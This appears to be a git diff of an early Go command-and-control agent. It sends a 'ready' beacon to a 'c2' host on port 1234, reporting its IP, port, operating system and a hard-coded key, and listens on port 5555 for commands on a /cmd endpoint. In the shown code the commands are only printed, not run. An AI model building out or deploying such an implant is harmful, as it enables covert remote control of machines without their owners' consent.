@@ -7,7 +7,17 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
+	"time"
 )
+
+// answer = (command)+(Key menager)+(Key client)+(answer)
+type Contact struct {
+	Ip     string
+	Port   string
+	System string //os
+	Key    string //new programm -> new individual key for autorizaiton (make with time and load main function) // ManagerKey string
+	Date   time.Time
+}
 
 func findLocalAddress(ips []net.IP) []string {
 	//192.168.0.?
@@ -29,19 +39,6 @@ func findLocalAddress(ips []net.IP) []string {
 			if octet_int == 10 {
 				LocalIps = append(LocalIps, ipStr)
 			}
-
-			// if private_net_type == 0 {
-			// 	if octet_int == 192 {
-			// 		private_net_type = 192
-			// 	} else if octet_int == 10 {
-			// 		private_net_type = 10
-			// 	}else{
-			// 		break
-			// 	}
-			// }else if private_net_type == 192{
-			// 	if octet_int == 168{
-			// 		octet_int_next,_ := strconv.Atoi(octet_array[i+1])
-			// 	}
 
 		}
 
@@ -75,58 +72,58 @@ func GetIPs() []net.IP {
 
 // port - 1234
 func main() {
-	//ip_addr := flag.String("ip", "localhost", "ip addres of c2")
+	ip_addr := flag.String("ip", "localhost", "ip addres of c2")
 	//endpoint := flag.String("endpoint", "", "endpoint c2")
 
 	flag.Parse()
 
 	//sendReadySignal(ip_addr)
-	ip := GetIPs()
-	fmt.Println(ip)
-	fmt.Println(findLocalAddress(ip))
+
+	go sendReadySignal(ip_addr)
+	startServer()
+
 }
 func sendReadySignal(ip *string) {
 	c2_addr := "http://" + *ip + ":1234/ready"
+	local_ips := GetIPs()
+	fmt.Println(local_ips)
+	//local_IP := findLocalAddress(local_ips)[0] - After coming set
+	local_IP := "localhost"
 
-	fmt.Printf(c2_addr)
+	fmt.Printf(local_IP)
 	fmt.Printf("\n")
-
-	body := strings.NewReader(`
+	body := strings.NewReader(fmt.Sprintf(`
 	{
-		"ip":"localhost:5555"
+		"Ip":"%s",
+		"Port":"%s",
+		"System":"%s",
+		"Key":"%s",
+		"Date":"%s"
 	}
-	`)
+	`, local_IP, "5555", "Windows", "123456789", time.Now().String()))
+
 	resp, err := http.Post(c2_addr, "application/json", body)
 	if err != nil {
 		fmt.Printf("Error with post request")
 	}
-	defer resp.Body.Close()
-	fmt.Printf("Status: " + resp.Status)
-	/*
-		var jsonData = []byte(`{
-			"ip":"localhost:5555"
-		}`)
-			request, error := http.NewRequest("POST", c2_addr, bytes.NewBuffer(jsonData))
-			request.Header.Set("Content-Type", "application/json; charset=UTF-8")
-
-			client := &http.Client{}
-			response, error := client.Do(request)
-			if error != nil {
-				panic(error)
-			}
-			defer response.Body.Close()
-
-			fmt.Println("response Status:", response.Status)
-			fmt.Println("response Headers:", response.Header)
-			body, _ := ioutil.ReadAll(response.Body)
-			fmt.Println("response Body:", string(body))
-	*/
-	go startServer()
+	resp.Body.Close()
+	fmt.Printf("Status: " + resp.Status + "\n")
 
 }
+
+//Server
+
 func startServer() {
+	fmt.Printf("Server started")
 	http.HandleFunc("/cmd", func(w http.ResponseWriter, r *http.Request) {
-		fmt.Printf(r.URL.Query().Get("m"))
+		fmt.Printf("cmd endpoint \n")
+		if r.Method != http.MethodPost {
+			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+		cmd := r.URL.Query().Get("m")
+
+		fmt.Printf(cmd)
 	})
 
 	http.ListenAndServe(":5555", nil)
